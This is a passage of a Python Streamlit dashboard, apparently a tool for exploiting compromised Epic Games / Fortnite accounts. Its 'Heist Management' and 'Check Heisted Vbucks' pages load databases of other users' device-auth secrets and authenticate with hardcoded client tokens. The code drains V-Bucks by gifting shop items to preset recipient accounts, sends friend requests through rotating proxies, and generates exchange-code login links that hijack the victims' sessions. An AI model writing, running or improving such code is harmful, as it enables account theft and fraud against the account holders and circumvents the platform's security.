                # Get incoming requests
                url_incoming = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account['account_id']}/incoming"
                headers = {
                    "Content-Type": "application/json",
                    "Authorization": f"Bearer {access_token}"
                }
                
                incoming_req = await client.get(url=url_incoming, headers=headers)
                if incoming_req.status_code != 200:
                    continue
                
                incoming_friends = incoming_req.json()
                if incoming_friends:
                    # Build list of account IDs to accept
                    to_accept = ",".join([friend['accountId'] for friend in incoming_friends])
                    
                    # Accept friend requests
                    url_accept = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{account['account_id']}/incoming/accept?targetIds={to_accept}"
                    accept_req = await client.post(url=url_accept, headers=headers)
                    
                    if accept_req.status_code == 200:
                        total_accepted += len(incoming_friends)
                        status_placeholder.info(f"Total friend requests accepted: {total_accepted}")
                
                # Wait 10 seconds before next check
                await asyncio.sleep(10)
            
            return True
    except Exception as e:
        st.error(f"Error in auto accept: {str(e)}")
        return False

def get_item_category(item):
    """Determine the category of an item based on its properties"""
    # Safely get type and name, providing default values
    item_type = (item.get('type', {}).get('name') or '').lower()
    name = (item.get('name') or item.get('devName') or '').lower()
    
    # Check for bundle first as it might be in the name
    if 'bundle' in item_type or 'bundle' in name:
        return 'bundles'
    # Check the type field first
    elif any(word in item_type for word in ['outfit', 'skin']):
        return 'outfits'
    elif any(word in item_type for word in ['emote', 'dance', 'emoji']):
        return 'emotes'
    elif any(word in item_type for word in ['pickaxe', 'harvesting']):
        return 'pickaxes'
    elif any(word in item_type for word in ['backpack', 'back bling']):
        return 'backblings'
    elif 'wrap' in item_type:
        return 'wraps'
    # If type doesn't help, check the name
    elif any(word in name for word in ['outfit', 'skin']):
        return 'outfits'
    elif any(word in name for word in ['emote', 'dance', 'emoji']):
        return 'emotes'
    elif any(word in name for word in ['pickaxe', 'harvesting']):
        return 'pickaxes'
    elif any(word in name for word in ['backpack', 'back bling']):
        return 'backblings'
    elif 'wrap' in name:
        return 'wraps'
    return 'other'

def heist_management_page():
    st.title("Heist Management")
    
    tab1, tab2, tab3, tab4, tab5 = st.tabs(["Gift", "Add Gift Accounts", "Web Link Generator", "Refresh V-Bucks", "Interactive Item Shop"])
    
    with tab1:
        st.subheader("Gift Management")
        col1, col2 = st.columns(2)
        with col1:
            # Preset accounts dictionary
            preset_accounts = {
                "Select preset account...": "",
                "Matteo": "b0fbe18932bb40469c5dc13e2d3f98ac",
                "Lucca": "223ae36b0946495a8ac5ec63370c2810",
                "Leah" : "94faf1ecf4da448b955f031cbdc47282",
                "Daniel" : "139ff8d7939344b499f7e7ed283fe6cc",
                "Ariel" : "2919499553af4cafb9adcb5da82d60ec",
                "Leah" : "94faf1ecf4da448b955f031cbdc47282"
            }

            
            
            # Create two-part input for account ID
            preset_choice = st.selectbox(
                "Select Preset Account",
                options=list(preset_accounts.keys()),
                key="preset_account_choice"
            )
            
            custom_id = st.text_input(
                "Or Enter Custom Account ID",
                value=preset_accounts[preset_choice] if preset_choice != "Select preset account..." else "",
                key="custom_account_id"
            )
            
            # Set the gift_to_id based on either preset or custom input
            gift_to_id = custom_id if custom_id else preset_accounts[preset_choice]
            
            search_type = st.selectbox("Search By", ["Item Number", "Offer ID", "Item Name"])
            search_value = st.text_input("Enter " + search_type)
            
            # Get and display shop items
            shop_items, offers = get_shop_items()
            st.text_area("Available Items:", value=shop_items, height=300)
            
            # Look up item details based on search type
            selected_item = None
            if search_value:
                try:
                    # Filter out virtual items first
                    valid_offers = []
                    item_number = 1
                    
                    # Build valid_offers list with proper numbering
                    for offer in offers:
                        name = offer.get('name') or offer.get('devName', '')
                        if "[VIRTUAL]" not in name:
                            valid_offers.append(offer)
                    
                    if search_type == "Item Number" and search_value.isdigit():
                        item_index = int(search_value) - 1
                        if 0 <= item_index < len(valid_offers):
                            selected_item = valid_offers[item_index]
                    
                    elif search_type == "Offer ID":
                        for offer in valid_offers:
                            if offer.get('offerId', '').lower() == search_value.lower():
                                selected_item = offer
                                break
                    
                    elif search_type == "Item Name":
                        for offer in valid_offers:
                            name = offer.get('name', '').lower() or offer.get('devName', '').lower()
                            if search_value.lower() in name:
                                selected_item = offer
                                break
                    
                    if selected_item:
                        st.info(f"""
                        Selected Item:
                        - Name: {selected_item.get('name', selected_item.get('devName', 'Unknown'))}
                        - Price: {selected_item['price']['final']} V-Bucks
                        """)
                        
                        # Show confirmation button
                        if st.button(f"Are you sure you want to gift {selected_item.get('name', selected_item.get('devName', 'Unknown'))}?"):
                            if not gift_to_id:
                                st.warning("Please fill in recipient Account ID")
                                return
                                
                            try:
                                # Check if added_{gift_to_id}.json exists
                                gift_file_path = f"./dbs/added_{gift_to_id}.json"
                                if not os.path.exists(gift_file_path):
                                    st.error(f"No accounts found for {gift_to_id}. Please add accounts first using Auth Management.")
                                    return
                                
                                # Load the accounts
                                with open(gift_file_path, "r", encoding="utf-8") as f:
                                    accounts = json.load(f)
                                
                                if not accounts:
                                    st.error("No accounts available for gifting")
                                    return
                                
                                # Find an account with enough V-Bucks
                                valid_accounts = [acc for acc in accounts if acc["vbucks"] >= selected_item['price']['final']]
                                
                                if not valid_accounts:
                                    st.error(f"No accounts found with enough V-Bucks ({selected_item['price']['final']})")
                                    return
                                
                                # Pick a random account with enough V-Bucks
                                selected_account = random.choice(valid_accounts)
                                
                                # Try Android first, then iOS
                                tokens = {
                                    "Android": "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU=",
                                    "iOS": "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
                                }
                                
                                success = False
                                for platform, client_token in tokens.items():
                                    try:
                                        st.info(f"Attempting gift with {platform}...")
                                        
                                        # First authenticate
                                        auth_url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
                                        auth_headers = {
                                            'Content-Type': 'application/x-www-form-urlencoded',
                                            'Authorization': f'basic {client_token}'
                                        }
                                        auth_data = f"grant_type=device_auth&account_id={selected_account['account_id']}&device_id={selected_account['device_id']}&secret={selected_account['secret']}"
                                        
                                        auth_req = requests.post(url=auth_url, headers=auth_headers, data=auth_data)
                                        
                                        if auth_req.status_code == 200:
                                            access_token = auth_req.json()["access_token"]
                                            
                                            # Send gift request
                                            gift_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{selected_account["account_id"]}/client/GiftCatalogEntry?profileId=common_core&rvn=-1'
                                            
                                            gift_data = json.dumps({
                                                "offerId": selected_item["offerId"],
                                                "currency": "MtxCurrency",
                                                "currencySubType": "", 
                                                "expectedTotalPrice": selected_item["price"]["final"],
                                                "gameContext": "Frontend.CatabaScreen",
                                                "receiverAccountIds": [gift_to_id],
                                                "giftWrapTemplateId": "",
                                                "personalMessage": ""
                                            })
                                            
                                            gift_headers = {
                                                'Content-Type': 'application/json',
                                                'Authorization': f'Bearer {access_token}'
                                            }
                                            
                                            gift_req = requests.post(url=gift_url, headers=gift_headers, data=gift_data)
                                            
                                            # Show the full response for debugging
                                            with st.expander("Response Details"):
                                                st.write(f"{platform} Status Code:", gift_req.status_code)
                                                st.json(gift_req.json())
                                            
                                            if gift_req.status_code == 200:
                                                success = True
                                                
                                                # Update account V-Bucks in database
                                                try:
                                                    # Update the added_{account_id}.json file
                                                    with open(gift_file_path, "r", encoding="utf-8") as f:
                                                        accounts = json.load(f)
                                                        
                                                    # Find and update the account that sent the gift
                                                    for i, acc in enumerate(accounts):
                                                        if acc["account_id"] == selected_account["account_id"]:
                                                            accounts[i]["vbucks"] -= selected_item["price"]["final"]
                                                            break
                                                            
                                                    # Save updated accounts back to file
                                                    with open(gift_file_path, "w", encoding="utf-8") as f:
                                                        json.dump(accounts, f, indent=4)
                                                        
                                                    st.success(f"""
                                                    ? Gift sent successfully with {platform}!
                                                    - Item: {selected_item.get('name', selected_item.get('devName', 'Unknown'))}
                                                    - To: {gift_to_id}
                                                    - From: {selected_account['display_name']}
                                                    - Price: {selected_item['price']['final']} V-Bucks
                                                    - Remaining V-Bucks: {selected_account['vbucks'] - selected_item['price']['final']}
                                                    """)
                                                except Exception as e:
                                                    st.error(f"Failed to update V-Bucks in database: {str(e)}")
                                                break
                                            elif "errors.com.epicgames.modules.gamesubcatalog.purchase_not_allowed" in str(gift_req.json()):
                                                st.warning(f"{platform} account needs 2FA enabled. Trying next platform...")
                                            else:
                                                st.warning(f"Gift failed with {platform}. Trying next platform...")
                                        else:
                                            st.warning(f"Authentication failed with {platform}. Trying next platform...")
                                            
                                    except Exception as e:
                                        st.error(f"Error with {platform}: {str(e)}")
                                
                                if not success:
                                    st.error("Failed to send gift with both Android and iOS")
                                
                            except Exception as e:
                                st.error(f"Error in gift process: {str(e)}")
                                st.exception(e)
                    else:
                        st.error("Item not found. Please check your search criteria.")
                        
                except Exception as e:
                    st.error(f"Error looking up item: {str(e)}")

    
    with tab2:
        st.subheader("Add Gift Accounts")
        
        col1, col2 = st.columns(2)
        
        with col1:
            # Preset account selection
            preset_accounts = {
                "Select preset account...": "",
                "Matteo": "b0fbe18932bb40469c5dc13e2d3f98ac",
                "Lucca": "223ae36b0946495a8ac5ec63370c2810",
                "Daniel" : "139ff8d7939344b499f7e7ed283fe6cc",
                "Ariel" : "2919499553af4cafb9adcb5da82d60ec",
                "Leah" : "94faf1ecf4da448b955f031cbdc47282"
            }
            
            account_selection = st.radio(
                "Choose Account Type",
                ["Preset Account", "Custom Account"],
                horizontal=True
            )
            
            if account_selection == "Preset Account":
                selected_preset = st.selectbox(
                    "Select Account",
                    list(preset_accounts.keys()),
                    key="preset_account"
                )
                account_id = preset_accounts[selected_preset]
            else:
                account_id = st.text_input("Custom Account ID")
            
            if account_id:
                st.code(account_id, language="text")
            min_vbucks = st.number_input("Minimum V-Bucks", min_value=0, value=0)
        
        def reset_stop_flag():
            st.session_state.should_stop = False

        if st.button("Add All", on_click=reset_stop_flag):
            if not account_id:
                st.warning("Please enter an Account ID")
                return
            
            try:
                # Load the current database
                if not st.session_state.loaded_db:
                    st.warning("Please load a database first!")
                    return
                
                with open(st.session_state.loaded_db, "r", encoding="utf-8") as f:
                    accounts = json.load(f)
                
                if "sus" in accounts:
                    accounts = accounts["sus"]
                
                progress_bar = st.progress(0)
                status_text = st.empty()
                
                # Add stop button
                stop_button_placeholder = st.empty()
                if stop_button_placeholder.button("Stop Process"):
                    st.session_state.should_stop = True
                    st.warning("Stopping process... Please wait for current operation to complete.")
                
                # Process accounts
                total = len(accounts)
                passed = 0
                failed = 0

                tokens = {
                    "Android": "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU=",
                    "iOS": "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE="
                }
                
                for i, account in enumerate(accounts):
                    # Check if should stop
                    if st.session_state.should_stop:
                        st.info("Process stopped by user")
                        break
                    
                    success = False
                    
                    # Get account details based on format
                    if "AccountId" in account:
                        acc_id = account["AccountId"]
                        dev_id = account["DeviceId"]
                        secret = account["Secret"]
                    else:
                        acc_id = account["account_id"]
                        dev_id = account["device_id"]
                        secret = account["secret"]

                    # Try both tokens (Android first)
                    for platform, token in tokens.items():
                        try:
                            url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
                            headers = {
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'Authorization': f'basic {token}'
                            }
                            data = f"grant_type=device_auth&account_id={acc_id}&device_id={dev_id}&secret={secret}"
                            
                            req = requests.post(url=url, headers=headers, data=data)
                            
                            if req.status_code == 200:
                                success = True
                                auth_info = req.json()
                                access_token = auth_info["access_token"]
                                display_name = auth_info["displayName"]
                                
                                # Get V-Bucks amount
                                profile_url = f'https://fortnite-public-service-prod11.ol.epicgames.com/fortnite/api/game/v2/profile/{acc_id}/client/QueryProfile?profileId=common_core&rvn=-1'
                                profile_headers = {
                                    'Content-Type': 'application/json',
                                    'Authorization': f'Bearer {access_token}'
                                }
                                
                                profile = requests.post(url=profile_url, headers=profile_headers, data="{}")
                                profile_data = profile.json()
                                
                                vbucks = 0
                                try:
                                    items = profile_data['profileChanges'][0]['profile']['items']
                                    for item in items:
                                        if items[item]['templateId'][:12] == "Currency:Mtx":
                                            vbucks += items[item]['quantity']
                                except:
                                    vbucks = 0
                                
                                # If account has enough V-Bucks, send friend request
                                if vbucks >= min_vbucks:
                                    proxy = random.choice(PROXIES)
                                    proxies = {
                                        "http://": f"http://{proxy}",
                                        "https//": f"https://{proxy}"
                                    }
                                    
                                    friend_url = f"https://friends-public-service-prod.ol.epicgames.com/friends/api/v1/{acc_id}/friends/{account_id}"
                                    friend_req = requests.post(friend_url, headers={"Authorization":f"Bearer {access_token}", "Content-Type":"application/json"}, proxies=proxies)
                                    
                                    if friend_req.ok or "errors.com.epicgames.friends.duplicate_friendship" in friend_req.text:
                                        # Create account details to save
                                        account_details = {
                                            "vbucks": vbucks,
                                            "account_id": acc_id,
                                            "device_id": dev_id,
                                            "secret": secret,
                                            "display_name": display_name,
                                            "platform_used": platform
                                        }
                                        
                                        # Load existing accounts if file exists
                                        output_path = f"./dbs/added_{account_id}.json"
                                        existing_accounts = []
                                        if os.path.exists(output_path):
                                            try:
                                                with open(output_path, "r", encoding="utf-8") as f:
                                                    existing_accounts = json.load(f)
                                            except json.JSONDecodeError:
                                                existing_accounts = []
                                        
                                        # Check if account exists and update if needed
                                        account_updated = False
                                        for idx, existing_acc in enumerate(existing_accounts):
                                            if existing_acc.get('account_id') == acc_id:
                                                # If V-Bucks amount is different, update the account
                                                if existing_acc.get('vbucks') != vbucks:
                                                    existing_accounts[idx] = account_details
                                                    st.info(f"Updated V-Bucks for account {display_name} from {existing_acc.get('vbucks')} to {vbucks}")
                                                    account_updated = True
                                                else:
                                                    st.info(f"Account {display_name} already exists with same V-Bucks amount")
                                                break
                                        
                                        # If account wasn't found, add it
                                        if not account_updated and not any(acc.get('account_id') == acc_id for acc in existing_accounts):
                                            existing_accounts.append(account_details)
                                            st.success(f"Added new account {display_name}")
                                        
                                        # Save updated accounts list
                                        with open(output_path, "w", encoding="utf-8") as f:
                                            json.dump(existing_accounts, f, indent=4)
                                        
                                        passed += 1
                                        break
                                    else:
                                        st.warning(f"Friend request failed with {platform}")
                                else:
                                    st.warning(f"Not enough V-Bucks ({vbucks}) with {platform}")
                            else:
                                st.warning(f"Authentication failed with {platform}")
                                
                        except Exception as e:
                            st.error(f"Error with {platform}: {str(e)}")
                    
                    if not success:
                        failed += 1
                        st.error(f"Failed with both platforms for account {acc_id}")
                    
                    # Update progress
                    progress = (i + 1) / total
                    progress_bar.progress(progress)
                    status_text.text(f"Processed {i+1}/{total} accounts | Passed: {passed} Failed: {failed}")
                
                # Clear the stop button after completion
                stop_button_placeholder.empty()
                
                # Show final results
                if passed > 0:
                    st.success(f"Successfully processed {passed} accounts")
                else:
                    st.warning("No accounts were successfully added")
                
                # Reset stop flag
                st.session_state.should_stop = False
                
            except Exception as e:
                st.error(f"Error in Add All process: {str(e)}")
                # Reset stop flag
                st.session_state.should_stop = False

    with tab3:
        st.subheader("Web Link Generator")
        
        col1, col2 = st.columns(2)
        
        with col1:
            acc_id = st.text_input("Account ID", key="web_link_account_id")
            
        if st.button("Generate Web Link"):
            if not acc_id:
                st.warning("Please enter an Account ID")
                return
                
            found = False
            for file in os.listdir("./dbs/checked/"):
                if not file.endswith(".json"):
                    continue
                    
                try:
                    with open(f"./dbs/checked/{file}", "r", encoding="utf-8") as f:
                        accounts = json.load(f)
                    
                    for i, account in enumerate(accounts):
                        if account["account_id"] == acc_id:
                            found = True
                            
                            # Try both iOS and Android tokens
                            tokens = {
                                "iOS": "MzQ0NmNkNzI2OTRjNGE0NDg1ZDgxYjc3YWRiYjIxNDE6OTIwOWQ0YTVlMjVhNDU3ZmI5YjA3NDg5ZDMxM2I0MWE=",
                                "Android": "M2Y2OWU1NmM3NjQ5NDkyYzhjYzI5ZjFhZjA4YThhMTI6YjUxZWU5Y2IxMjIzNGY1MGE2OWVmYTY3ZWY1MzgxMmU="
                            }
                            
                            success = False
                            for platform, token in tokens.items():
                                try:
                                    url = 'https://account-public-service-prod.ol.epicgames.com/account/api/oauth/token'
                                    headers = {
                                        'Content-Type': 'application/x-www-form-urlencoded',
                                        'Authorization': f'basic {token}'
                                    }
                                    data = f"grant_type=device_auth&account_id={account['account_id']}&device_id={account['device_id']}&secret={account['secret']}"
                                    
                                    req = requests.post(url=url, headers=headers, data=data)
                                    if req.status_code == 200:
                                        success = True
                                        access_token = req.json()["access_token"]
                                        
                                        # Get exchange code
                                        exchange_url = "https://account-public-service-prod.ol.epicgames.com/account/api/oauth/exchange"
                                        exchange_headers = {"Authorization": f"Bearer {access_token}"}
                                        exchange_response = requests.get(exchange_url, headers=exchange_headers)
                                        
                                        if exchange_response.status_code == 200:
                                            token = exchange_response.json()["code"]
                                            new_web_link = f"https://www.epicgames.com/id/exchange?exchangeCode={token}&redirectUrl=https://www.epicgames.com/"
                                            
                                            # Update web_link in the account
                                            accounts[i]["web_link"] = new_web_link
                                            
                                            # Save updated accounts back to file first
                                            with open(f"./dbs/checked/{file}", "w", encoding="utf-8") as f:
                                                json.dump(accounts, f, indent=4)
                                            
                                            # Now load and display the updated account info
                                            with open(f"./dbs/checked/{file}", "r", encoding="utf-8") as f:
                                                updated_accounts = json.load(f)
                                                updated_account = next(acc for acc in updated_accounts if acc["account_id"] == acc_id)
                                            
                                            # Display success messages and account info
                                            st.success(f"Successfully authenticated with {platform}")
                                            st.success("Web link updated in database!")
                                            st.json(updated_account)
                                            st.code(new_web_link)
                                            
                                            # Copy to clipboard
                                            pyperclip.copy(new_web_link)
                                            st.success("Web link copied to clipboard!")
                                            
                                            break
                                        else:
                                            st.error(f"Failed to get exchange code with {platform}")
                                    else:
                                        st.warning(f"Authentication failed with {platform}")
                                except Exception as e:
                                    st.error(f"Error with {platform}: {str(e)}")
                            
                            if not success:
                                st.error("Failed to authenticate with both iOS and Android")
                            break
                            
                    if found:
                        break
                        
                except Exception as e:
                    st.error(f"Error reading file {file}: {str(e)}")
                    
            if not found:
                st.warning("Account not found in any database")

    with tab4:
        st.subheader("Refresh V-Bucks")
        
        # Get list of available account files
        account_files = []
        if os.path.exists("./dbs/"):
            for file in os.listdir("./dbs/"):
                if file.startswith("added_") and file.endswith(".json"):
                    account_id = file.replace("added_", "").replace(".json", "")
                    account_files.append(account_id)
        
        if not account_files:
            st.warning("No account files found. Add accounts first using Auth Management.")
            return
            
        # Create dropdown for account selection
        account_id = st.selectbox(
            "Select Account to Refresh",
            options=account_files,
            key="refresh_account_dropdown"
        )
        
        if account_id:
            gift_file_path = f"./dbs/added_{account_id}.json"
            
            if st.button("\U0001F504 Refresh VBucks", key="refresh_vbucks_btn"):
                try:
                    with open(gift_file_path, "r", encoding="utf-8") as f:
                        accounts = json.load(f)
                    
                    progress_text = st.empty()
                    progress_bar = st.progress(0)
                    
                    progress_text.text("Refreshing VBucks...")
                    
                    # Refresh V-bucks using threading (always Android)
                    updated_accounts = refresh_all_vbucks(accounts, "Android")
                    
                    if updated_accounts:
                        if update_account_vbucks(gift_file_path, updated_accounts):
                            progress_bar.progress(100)
                            progress_text.text("VBucks refresh complete!")
                            st.success(f"Successfully updated {len(updated_accounts)} accounts")
                            
                            # Display updated accounts
                            st.subheader("Updated Accounts")
                            for acc in updated_accounts:
                                st.info(f"Account ID: {acc['account_id']}\nVBucks: {acc['vbucks']:,}")
                            
                            st.experimental_rerun()
                    else:
                        st.error("No accounts were successfully updated")
                
                except Exception as e:
                    st.error(f"Error refreshing VBucks: {str(e)}")
                    st.exception(e)

def get_rarity_color(rarity):
    """Return color code based on item rarity"""
    rarity_colors = {
        'Common': '#b1b1b1',
        'Uncommon': '#60aa3a',
        'Rare': '#49acf2',
        'Epic': '#b15be2',
        'Legendary': '#ea8d23',
        'Marvel': '#ed1d24',
        'Icon Series': '#00b8ff',
        'Gaming Legends': '#5cf0ff'
    }
    return rarity_colors.get(rarity, '#ffffff')
    
def load_db_page():
    st.title("Load Database")
    
    # Add state for selected database
    if 'selected_db' not in st.session_state:
        st.session_state.selected_db = None
    
    col1, col2 = st.columns(2)
    
    with col1:
        st.subheader("Checked DBs")
        for file in os.listdir("./dbs/checked/"):
            if file.endswith(".json"):
                if st.button(f"\U0001F4C1 {file}", key=f"checked_{file}"):
                    st.session_state.selected_db = f"./dbs/checked/{file}"
                    st.info(f"Selected: {file}")
    
    with col2:
        st.subheader("Unchecked DBs")
        for file in os.listdir("./dbs/"):
            if file.endswith(".json") and not file.startswith("."):
                if st.button(f"\U0001F4C1 {file}", key=f"unchecked_{file}"):
                    st.session_state.selected_db = f"./dbs/{file}"
                    st.info(f"Selected: {file}")
    
    st.markdown("---")
    if st.session_state.selected_db:
        if st.button("Load Selected Database", key="load_selected_db"):
            st.session_state.loaded_db = st.session_state.selected_db
            st.success(f"Successfully loaded: {os.path.basename(st.session_state.selected_db)}")
    else:
        st.warning("Please select a database first")

def db_manager_page():
    st.title("Database Manager")
    
    if not st.session_state.loaded_db:
        st.warning("Please load a database first!")
        return
    
    st.subheader(f"Managing: {os.path.basename(st.session_state.loaded_db)}")
    
    col1, col2 = st.columns(2)
    
    with col1:
        # Create a container for the check credentials section
        check_creds_container = st.container()
        
        with check_creds_container:
            if st.button("Check Credentials", key="check_creds_btn"):
                st.session_state.show_client_choice = True
            
            if 'show_client_choice' in st.session_state and st.session_state.show_client_choice:
                client_choice = st.radio("Select Client", ["iOS", "Android"], key="client_choice")
                if st.button("Start Check", key="start_check"):
                    try:
                        # Changed to use UTF-8 encoding
                        with open(st.session_state.loaded_db, "r", encoding="utf-8") as f:
                            accounts = json.load(f)
                        if "sus" in accounts:
                            accounts = accounts["sus"]
                        asyncio.run(check_credentials(accounts, client_choice.lower()))
                    except Exception as e:
                        st.error(f"Error checking credentials: {str(e)}")
    
    with col2:
        if st.button("Convert iOS to Android"):
            try:
                # Changed to use UTF-8 encoding
                with open(st.session_state.loaded_db, "r", encoding="utf-8") as f:
                    accounts = json.load(f)
                if "sus" in accounts:
                    accounts = accounts["sus"]
                asyncio.run(convert_ios_to_android(accounts))
            except Exception as e:
                st.error(f"Error converting accounts: {str(e)}")
def main():
    # Create data directory if it doesn't exist
    os.makedirs("data", exist_ok=True)
    setup_logging()

    if not check_password():
        return
    
    christmas_days, christmas_hours, christmas_minutes, christmas_seconds = get_christmas_countdown()
    thanksgiving_days, thanksgiving_hours, thanksgiving_minutes, thanksgiving_seconds = get_thanksgiving_countdown()

    st.sidebar.markdown("""
    <style>
        .countdown-box {
            background: rgba(196,30,58,0.1);
            padding: 10px;
            border-radius: 8px;
            border: 1px solid #c41e3a;
            margin-bottom: 20px;
            text-align: center;
            color: #c41e3a;
            font-size: 14px;
        }
        .countdown-time {
            font-family: monospace;
            font-weight: bold;
        }
    </style>
    """, unsafe_allow_html=True)
    
    # Display Thanksgiving countdown
    st.sidebar.markdown(f"""
    <div class="countdown-box">
        âœ§ Time until Thanksgiving:<br>
        <span class="countdown-time">
        {thanksgiving_days}d {thanksgiving_hours:02d}h {thanksgiving_minutes:02d}m {thanksgiving_seconds:02d}s
        </span>
    </div>
    """, unsafe_allow_html=True)
    
    # Display Christmas countdown
    st.sidebar.markdown(f"""
    <div class="countdown-box">
        âœ§ Time until Christmas:<br>
        <span class="countdown-time">
        {christmas_days}d {christmas_hours:02d}h {christmas_minutes:02d}m {christmas_seconds:02d}s
        </span>
    </div>
    """, unsafe_allow_html=True)

    st.markdown("""
    <style>
        .snowflake {
            color: #fff;
            font-size: 1em;
            font-family: Arial;
            text-shadow: 0 0 2px #fff;
            position: fixed;
            z-index: 9999;
            pointer-events: none;
            user-select: none;
            cursor: default;
        }
    </style>

    <div class="snowflakes" id="snowflakes"></div>

    <script>
    // Create snowflakes
    function createSnowflakes() {
        const snowflakes = document.getElementById('snowflakes');
        // Increased number of snowflakes from 50 to 100
        for(let i = 0; i < 100; i++) {
            const snowflake = document.createElement('div');
            snowflake.className = 'snowflake';
            // Alternate between different snowflake characters
            snowflake.innerHTML = ['â…', 'â†', 'â„', 'âœ§'][Math.floor(Math.random() * 4)];
            snowflake.style.left = Math.random() * 100 + 'vw';
            // Varied animation duration more
            snowflake.style.animationDuration = (Math.random() * 4 + 2) + 's';
            // Increased opacity range
            snowflake.style.opacity = Math.random() * 0.7 + 0.3;
            // Increased size range
            snowflake.style.fontSize = (Math.random() * 15 + 8) + 'px';
            
            // Add position tracking
            snowflake.dataset.x = Math.random() * window.innerWidth;
            snowflake.dataset.y = -20;
            // Varied speed more
            snowflake.dataset.speed = Math.random() * 1.5 + 0.5;
            snowflakes.appendChild(snowflake);
        }
    }

    // Track mouse position
    let mouseX = 0;
    let mouseY = 0;
    document.addEventListener('mousemove', (e) => {
        mouseX = e.clientX;
        mouseY = e.clientY;
    });

    // Animate snowflakes
    function moveSnowflakes() {
        const snowflakes = document.getElementsByClassName('snowflake');
        Array.from(snowflakes).forEach(snowflake => {
            let x = parseFloat(snowflake.dataset.x);
            let y = parseFloat(snowflake.dataset.y);
            const speed = parseFloat(snowflake.dataset.speed);
            
            // Calculate distance from mouse
            const dx = mouseX - x;
            const dy = mouseY - y;
            const distance = Math.sqrt(dx * dx + dy * dy);
            
            // Move away from mouse if too close (increased range and effect)
            if(distance < 150) {
                const angle = Math.atan2(dy, dx);
                x -= Math.cos(angle) * (150 - distance) * 0.15;
            }
            
            // Enhanced movement
            y += speed;
            x += Math.sin(y * 0.025) * 0.8;  // More pronounced swaying
            
            // Reset if out of bounds
            if(y > window.innerHeight) {
                y = -20;
                x = Math.random() * window.innerWidth;
            }
            
            // Update position
            snowflake.dataset.x = x;
            snowflake.dataset.y = y;
            snowflake.style.transform = `translate(${x}px, ${y}px)`;
        });
        
        requestAnimationFrame(moveSnowflakes);
    }

    // Initialize
    createSnowflakes();
    moveSnowflakes();

    // Handle window resize
    window.addEventListener('resize', () => {
        document.getElementById('snowflakes').innerHTML = '';
        createSnowflakes();
    });
    </script>
    """, unsafe_allow_html=True)

    st.sidebar.title("Navigation")
    page = st.sidebar.radio("Select Page", [
        "Home",
        "Load DB",
        "DB Manager",
        "Check Heisted Vbucks",
        "Sort Account Files",
        "Get Account Info",
        "Heist Management",
        "Account Management",
        "Item Shop"
    ])
    
    if page == "Home":
        home_page()
    elif page == "Load DB":
        load_db_page()
    elif page == "DB Manager":
        db_manager_page()
    elif page == "Check Heisted Vbucks":
        check_heisted_vbucks_page()
    elif page == "Sort Account Files":
        sort_account_files_page()
    elif page == "Get Account Info":
        get_account_info_page()
    elif page == "Heist Management":
        heist_management_page()
    elif page == "Item Shop":  
        item_shop_page()
    elif page == "Account Management":
        account_management_page()

if __name__ == "__main__":
    main()